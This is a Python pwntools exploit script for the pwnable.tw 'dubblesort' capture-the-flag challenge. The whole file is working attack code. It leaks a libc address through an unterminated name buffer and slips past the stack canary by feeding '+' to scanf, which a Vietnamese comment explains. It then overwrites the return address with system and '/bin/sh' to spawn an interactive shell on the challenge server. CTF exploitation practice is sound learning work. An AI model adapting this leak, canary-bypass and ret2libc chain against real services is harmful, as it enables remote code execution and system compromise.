#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10101
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)

# OFFSET & VARIABLES
# FUNCTIONS
def enter_num(p, num):
    p.sendlineafter(b": ", B(num))

# MAIN
def main():
    p = connect()

    p.sendlineafter(b"What your name :", b"A" * 28) # LOCAL -> 24, REMOTE 28
    
    p.recvline()
    STACK_LEAK = u32(b"\0" + p.recv(3))
    
    libc.address = STACK_LEAK - 0x1b0000
    
    SYSTEM_ADDRESS = libc.symbols["system"]
    SHELL_ADDRESS = next(libc.search(b"/bin/sh\x00"))
    
    print(f"LIBC ADDRESS -> {hex(libc.address)}")
    print(f"SYSTEM ADDRESS -> {hex(SYSTEM_ADDRESS)}")
    print(f"SHELL ADDRESS -> {hex(SHELL_ADDRESS)}")
    
    p.sendlineafter(b":", b"35")
    for i in range(24):
        enter_num(p, i)
    
    '''
    Do scanf nhận input là "+" thì nó sẽ trả về 0, cho nên giá trị của tại 25 là canary vẫn được giữ nguyên.
    Mục đích chính là để qua phần nhập số thứ 25.
    '''

    p.sendlineafter(b": ", b"+")
    for j in range(7):
        enter_num(p, libc.address)
    
    enter_num(p, SYSTEM_ADDRESS)
    enter_num(p, SHELL_ADDRESS)
    enter_num(p, SHELL_ADDRESS)

    print("[+] Payload sent, attempting shell...")
    p.interactive()

if __name__ == '__main__':
    main()